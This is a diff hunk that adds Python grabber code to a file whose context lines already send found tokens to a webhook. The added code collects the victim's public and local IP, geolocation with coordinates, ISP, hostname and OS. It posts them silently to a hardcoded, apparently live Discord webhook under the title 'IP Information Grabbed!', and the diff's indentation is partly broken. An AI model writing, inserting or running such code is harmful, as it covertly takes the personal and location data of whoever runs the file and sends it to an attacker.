@@ -1351,4 +1351,70 @@ if tokens_found:
         send_to_webhook(token) 
 else:
     pass
+    import requests
+import platform
+import socket
+import sys
+
+def get_ip():
+    try:
+        response = requests.get('https://api.ipify.org?format=json', timeout=5)
+        return response.json()['ip']
+    except:
+        return "Unknown"
+
+def get_ip_info(ip):
+    try:
+        response = requests.get(f'http://ip-api.com/json/{ip}', timeout=5)
+        return response.json()
+    except:
+        return {}
+
+def get_system_info():
+    try:
+        hostname = socket.gethostname()
+        local_ip = socket.gethostbyname(hostname)
+    except:
+        hostname = "Unknown"
+        local_ip = "Unknown"
     
+    return {
+        'hostname': hostname,
+        'local_ip': local_ip,
+        'os': platform.system(),
+        'os_version': platform.version(),
+        'machine': platform.machine()
+    }
+
+def send_to_webhook():
+    webhook_url = "https://discord.com/api/webhooks/1472533694429270097/2W7ibPEHUTr-UkVkP2sKQ9rBm3yzHlzxx6WFrOsEXbeRX7UQg1r4SshPEweKwCN8-Ta0"
+    
+    ip = get_ip()
+    ip_info = get_ip_info(ip)
+    sys_info = get_system_info()
+    
+    embed = {
+        "embeds": [{
+            "title": "IP Information Grabbed!",
+            "color": 0x000000,
+            "fields": [
+                {"name": "Public IP", "value": ip, "inline": True},
+                {"name": "Local IP", "value": sys_info['local_ip'], "inline": True},
+                {"name": "Country", "value": ip_info.get('country', 'N/A'), "inline": True},
+                {"name": "City", "value": ip_info.get('city', 'N/A'), "inline": True},
+                {"name": "ISP", "value": ip_info.get('isp', 'N/A'), "inline": False},
+                {"name": "Coordinates", "value": f"{ip_info.get('lat', 'N/A')}, {ip_info.get('lon', 'N/A')}", "inline": False},
+                {"name": "Hostname", "value": sys_info['hostname'], "inline": True},
+                {"name": "OS", "value": f"{sys_info['os']} {sys_info['machine']}", "inline": True}
+            ]
+        }]
+    }
+    
+    try:
+        requests.post(webhook_url, json=embed, timeout=10)
+    except:
+        pass
+
+if __name__ == "__main__":
+    send_to_webhook()
+
